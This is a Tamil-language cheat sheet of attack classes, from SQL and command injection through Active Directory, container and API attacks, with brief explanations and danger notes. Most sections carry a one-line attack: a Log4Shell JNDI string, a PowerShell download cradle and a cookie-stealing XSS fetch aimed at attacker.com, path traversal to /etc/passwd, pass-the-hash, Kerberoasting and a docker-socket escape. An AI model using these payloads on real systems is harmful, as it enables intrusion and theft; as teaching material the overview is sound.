1. இன்ஜெக்ஷன் தாக்குதல்கள் (Injection Attacks)

பயனரிடமிருந்து பெறப்படும் உள்ளீடுகளைச் சரிபார்க்காமல், உள்கட்டமைப்பு வினவல்களுடன் நேரடியாக இணைக்கும்போது இவை நிகழ்கின்றன.

SQL Injection (Error, Union, Blind, Time-based, Out-of-band)

வலைப்பக்க உள்ளீட்டு படிவங்கள் மூலம் தீங்கிழைக்கும் SQL கட்டளைகளைச் செலுத்தி, தரவுத்தளத்தை (Database) அணுகுதல்.

நிஜ உலக ஆபத்து (Real-world Danger): வாடிக்கையாளர்களின் கடவுச்சொற்கள், வங்கி விவரங்கள் முற்றிலும் திருடப்படுதல் அல்லது தரவுகள் அழிக்கப்படுதல்.
# sqlmap மூலம் தானியங்கி முறையில் தரவுத்தளத்தை ஆய்வு செய்தல்
sqlmap -u "http://example.com/item.php?id=1" --dbs --batch
பாதுகாப்பான குறியீடு (Remediation) - PHP PDO: 
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $userInput]);

Command Injection & Argument Injection

வலைப்பயன்பாட்டின் வழியே நேரடியாக இயக்க முறைமையின் (Operating System) நிர்வாகக் கட்டளைகளைப் புகுத்தி இயக்குவது.

நிஜ உலக ஆபத்து (Real-world Danger): தாக்குபவர் சர்வரின் முனையத்தை (Shell) தன் கட்டுப்பாட்டுக்குள் கொண்டுவந்து பிற கணினிகளைத் தாக்கத் தொடங்குவார்.
# உள்ளீட்டுப் பெட்டியில் கட்டளையை இணைத்தல்
; cat /etc/passwd

Template Injections (SSTI / CSTI) & Expression Language Injection

சர்வர் அல்லது கிளையண்ட் பக்க டெம்ப்ளேட் எஞ்சின்களில் (உதா: Twig, Jinja, Angular) குறியீடுகளைச் செலுத்தி மாற்றுவது.

நிஜ உலக ஆபத்து (Real-world Danger): சர்வர் பக்கத்தில் தன்னிச்சையான நிரல்களை இயக்கி (RCE) முழு சர்வரையும் முடக்குதல்.
${7*7} # SSTI கட்டமைப்பைச் சோதிக்கும் குறியீடு

LDAP, XPath & NoSQL Injection

நிறுவனங்களின் Directory Services (LDAP) அல்லது SQL அல்லாத தரவுத்தளங்களின் (MongoDB) வினவல்களை மாற்றி அமைப்பது.

{"username": {"$gt": ""}, "password": {"$gt": ""}} # MongoDB லாகின் பைபாஸ்

Log4Shell (CVE-2021-44228) & Spring4Shell

ஜாவா லாகிங் லைப்ரரிகளில் (Log4j) உள்ள குறைபாட்டைப் பயன்படுத்தி ரிமோட் சர்வர்களில் மால்வேர்களைப் பதிவிறக்கி இயக்குவது.

நிஜ உலக ஆபத்து (Real-world Danger): உலகளவில் கோடிக்கணக்கான சேவையகங்கள் ஒரே நாளில் ஹேக்கர்களின் கட்டுப்பாட்டிற்குள் சென்றது போன்ற பெரும் நிதி இழப்பு.
${jndi:ldap://attacker.com/exploit}

CRLF, Header, IMAP, SMTP, OGNL, JNDI, SSI Injection

மின்னஞ்சல் நெறிமுறைகள் மற்றும் சர்வர் ஹெடர்களில் \r\n குறியீடுகளைப் புகுத்தி பயனர்களின் செஷன்களைத் திருடுவது அல்லது ஸ்பேம் அனுப்புவது.

2. குறியீடு இயக்குதல் தாக்குதல்கள் (Code Execution Attacks)

Remote Code Execution (RCE) & Local Code Execution (LCE)

நெட்வொர்க் வழியாக தூரத்தில் இருக்கும் சர்வரிலோ அல்லது உள்ளூர் கணினியிலோ தன்னிச்சையான கட்டளைகளை இயக்குவது.

நிஜ உலக ஆபத்து (Real-world Danger): நிறுவனத்தின் முக்கியத் தரவுகள் குறியாக்கம் செய்யப்பட்டு ரேன்சம்வேர் (Ransomware) தாக்குதலுக்கு உள்ளாகுதல்.
nc -lvnp 4444 # தாக்குபவரின் கணினியில் ரிவர்ஸ் ஷெல் கேட்பான் அமைத்தல்

Deserialization Attacks

ஆப்ஜெக்ட்டுகளை (Objects) மீண்டும் கட்டமைக்கும்போது (Java, .NET, PHP, Python Pickle, Ruby Marshal) தீங்கிழைக்கும் ஆப்ஜெக்ட்டுகளைப் புகுத்துவது.

java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

Dynamic Code Execution & Script-based Execution

நிரலாக்க மொழிகளில் உள்ள ஆபத்தான செயல்பாடுகள் (உதா: JavaScript eval(), Python exec()) மற்றும் PowerShell, Bash, VBScript போன்றவற்றைத் தவறாகப் பயன்படுத்துதல்.

powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/s.ps1')"

Memory Corruption (Buffer, Heap, Stack Overflow, UAF, ROP, JOP, Format String, Integer Overflow)

C/C++ மொழிகளில் எழுதப்பட்ட மென்பொருள்களின் நினைவகத்தை (Memory) சிதைத்து, பாயிண்டர்களை மாற்றி கணினியைக் கைப்பற்றுவது.

நிஜ உலக ஆபத்து (Real-world Danger): இயக்க முறைமைகளின் (OS) பாதுகாப்பு அடுக்குகள் உடைந்து கணினிகள் செயலிழப்பது.
python3 -c "print('A' * 1000)" | ./vulnerable_binary

3. கோப்பு சார்ந்த தாக்குதல்கள் (File-Based Attacks)

Malicious Office Macros (VBA, XLM 4.0, DDE), RTF & PDF Exploits

ஆபிஸ் ஆவணங்கள் மற்றும் பிடிஎஃப் கோப்புகளைத் திறக்கும்போது வாசகருக்குத் தெரியாமல் பின்னணியில் மால்வேர்களை இயங்க வைப்பது.

நிஜ உலக ஆபத்து (Real-world Danger): ஈமெயில் வழியாக நிறுவன ஊழியர்களை ஏமாற்றி ஒட்டுமொத்த நிறுவன நெட்வொர்க்கையும் கைப்பற்றுதல் (Phishing Campaign).

LNK, CHM, HTA Abuse, Zip Slip, Symlink Attack, Zip Bomb, Polyglots, Steganography, ADS, ISO, OneNote Abuse

Zip Bomb: சிறிய அளவில் இருக்கும் ஜிப் கோப்பிற்குள் பல ஜிகாபைட் வெற்றுத் தரவை வைத்து சர்வர் நினைவகத்தை முடக்குவது.

Alternate Data Streams (ADS): விண்டோஸில் ஒரு சாதாரண உரைக்கோப்பிற்குப் பின்னால் மால்வேரை ஒளித்து வைப்பது.

type backdoor.exe > readme.txt:hidden.exe # ADS கோப்பை உருவாக்குதல்

4. வலைப்பக்க தாக்குதல்கள் (Web Application Attacks)

Cross-Site Scripting (XSS - Reflected, Stored, DOM, mXSS, Blind)

பயனர்களின் பிரௌசர்களில் தீங்கிழைக்கும் ஜாவாஸ்கிரிப்ட் குறியீடுகளை இயக்கி அவர்களின் அமர்வுத் தரவை (Session Cookies) திருடுவது.

<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>
தற்காப்பு முறை - HTML Encoding: 
<p><?php echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8'); ?></p>

CSRF & Server-Side Request Forgery (SSRF)

SSRF to IMDS: கிளவுட் சர்வர் மூலமாக அதன் உள்வட்ட கிளவுட் மெட்டாடேட்டாவை (AWS/Azure Credentials) திருடுதல்.

நிஜ உலக ஆபத்து (Real-world Danger): நிறுவனத்தின் கிளவுட் உள்கட்டமைப்பு மற்றும் தரவுச் சேமிப்பகங்கள் முற்றிலும் ஹேக்கர்களின் வசமாவது.
http://vulnerable.com/preview?url=http://169.254.169.254/latest/meta-data/

Path Traversal, LFI, RFI & File Upload Bypass

LFI: சர்வரில் உள்ள ரகசியக் கோப்புகளை இணையதளம் வழியாக வாசிப்பது. File Upload Bypass: மலீசியஸ் கோப்புகளை படம் போல ஏமாற்றி அப்லோட் செய்தல்.

http://example.com/page.php?file=../../../../etc/passwd

IDOR, Broken Access Control, Authentication Flaws, Session Fixation

பயனர் கணக்கு மேலாண்மை மற்றும் அணுகல் கட்டுப்பாட்டுத் தவறுகளைப் பயன்படுத்தி பிற பயனர்களின் கணக்குகளை அனுமதியின்றி அணுகுதல்.

Web Cache Poisoning, Deception, Prototype Pollution, Dependency Confusion, Subdomain Takeover, Clickjacking, CORS, JWT, OAuth Abuse, GraphQL, WebSockets

நவீன வலைப்பக்க கட்டமைப்புகளான ஜேடபிள்யூடி (JWT), கிராப்கியூஎல் (GraphQL), மற்றும் தேர்ட்-பார்ட்டி டிபென்டென்சிகளில் நடக்கும் சிக்கலான தாக்குதல்கள்.

5. உள்கட்டமைப்பு மற்றும் கணினி தாக்குதல்கள் (Infrastructure & System)

Process Injection, DLL Injection, PE, Process Hollowing, Thread Hijacking, APC, AtomBombing

பாதுகாப்பான ஒரு கணினி ப்ராசஸிற்குள் (உதா: explorer.exe) மால்வேர் குறியீடுகளை உட்செலுத்தி ஆன்டிவைரஸை ஏமாற்றுவது.

நிஜ உலக ஆபத்து (Real-world Danger): கணினியில் பாதுகாப்பு மென்பொருள்கள் இயங்கினாலும், மால்வேர் கண்டறியப்படாமல் தொடர்ந்து இயங்குவது.

Living-off-the-Land (LOLBAS / GTFOBins) & Signed Binary Proxy Execution

கணினியில் புதிய மால்வேர்களைப் பதிவிறக்காமல், ஏற்கனவே இருக்கும் நம்பகமான டூல்களை (உதா: certutil, less) தவறாகப் பயன்படுத்துவது.

less /etc/passwd
!/bin/sh # less டூலுக்குள் இருந்து ரூட் ஷெல் பெறுவது

Privilege Escalation, Persistence & Lateral Movement (Token Manipulation, Sudo/SUID Abuse, Registry Run Keys, Scheduled Tasks, Pass-the-Hash, Pass-the-Ticket, RDP Hijacking, PsExec)

நெட்வொர்க்கில் ஒரு சாதாரண பயனர் கணக்கிலிருந்து நிர்வாகி கணக்கிற்குத் தனது உரிமைகளை உயர்த்துவது மற்றும் பாஸ்வேர்டு இல்லாமல் ஹாஷ்-ஐ மட்டும் வைத்து பிற கணினிகளுக்குள் நுழைவது.

crackmapexec smb 192.168.1.0/24 -u Admin -H "NTLM_HASH_HERE"

Defense Evasion, Discovery, Collection, Exfiltration & C2 (Obfuscation, Masquerading, Timestomping, Rootkit, Bootkit, Keylogging, DNS Tunneling, Domain Fronting, Supply Chain, Hardware, Rowhammer, Spectre, Meltdown)

தாக்குதல் நடப்பதை மறைப்பது, விசைப்பலகை அழுத்தங்களை ரகசியமாகக் கண்காணிப்பது (Keylogging) மற்றும் சிபியு (CPU) வன்பொருள் குறைபாடுகளைப் பயன்படுத்தி நினைவக ரகசியங்களை வாசிப்பது.

6. ஆக்டிவ் டைரக்டரி மற்றும் கிளவுட் தாக்குதல்கள் (Active Directory & Cloud)

Active Directory Credential Access (Kerberoasting, AS-REP Roasting, DCSync, LSASS Dumping, NTDS.dit Extraction)

விண்டோஸ் ஆக்டிவ் டைரக்டரி நெட்வொர்க்கில் உள்ள கணக்குகளின் அங்கீகார டிக்கெட்டுகள் மற்றும் நினைவகத்தில் உள்ள பாஸ்வேர்டு ஹாஷ்களைத் திருடுதல்.

impacket-GetUserSPNs -request -dc-ip 192.168.1.10 domain.local/user

ADCS Abuse (ESC1 to ESC8) & Certifried

Active Directory Certificate Services-ல் உள்ள தவறான உள்ளமைவுகளைப் பயன்படுத்தி போலியான டிஜிட்டல் சான்றிதழ்கள் மூலம் டொமைன் அட்மினாக மாறுவது.

நிஜ உலக ஆபத்து (Real-world Danger): ஒட்டுமொத்த நிறுவனத்தின் கணினிகள், மின்னஞ்சல்கள் மற்றும் நெட்வொர்க் உள்கட்டமைப்பின் முழுமையான வீழ்ச்சி.

Cloud & Container Escape (Docker Socket Abuse, Privileged Container, CVE-2019-5736, Kubernetes Attacks)

டாக்கர் கன்டெய்னரில் அல்லது கியூபர்நெட்டிஸ் கிளஸ்டரில் உள்ள குறைபாடுகளைப் பயன்படுத்தி நிஜ ஹோஸ்ட் சர்வர் கணினிக்குள் நுழைவது.

docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host

7. ஏபிஐ மற்றும் மேம்பட்ட குறைபாடுகள் (API & Advanced Flaws)

API Attacks (BOLA, BFLA, Rate Limit Bypass, SAML Assertion Replay, XML Signature Wrapping, HTTP/2 Rapid Reset)

BOLA / IDOR: ஏபிஐ கோரிக்கைகளில் ஐடிகளை (User IDs) மாற்றுவதன் மூலம் பிற பயனர்களின் தனிப்பட்ட தரவுகளைத் திரட்டுவது.

GET /api/v1/profile?user_id=1002 HTTP/1.1 # பயனர் ஐடியை 1001-லிருந்து 1002 ஆக மாற்றுதல்

Race Condition (TOCTOU), Business Logic Flaws, DevOps (CI/CD Pipeline Poisoning, GitHub Actions Injection, Secrets in IaC), Cloud Privilege Escalation

Race Condition: ஒரே மில்லிசெகண்டில் பல கோரிக்கைகளை அனுப்பி வங்கிப் பரிமாற்றம் அல்லது கூப்பன்களை இருமுறை பயன்படுத்துவது. CI/CD Poisoning: நிறுவனங்களின் ஆட்டோமேஷன் பைப்லைன்களில் நச்சு நிரல்களைப் புகுத்துவது.

நிஜ உலக ஆபத்து (Real-world Danger): வாடிக்கையாளர்களுக்குச் செல்லும் மென்பொருள் பதிப்புகளில் மால்வேர் கலந்து செல்வது (Supply Chain Compromise).
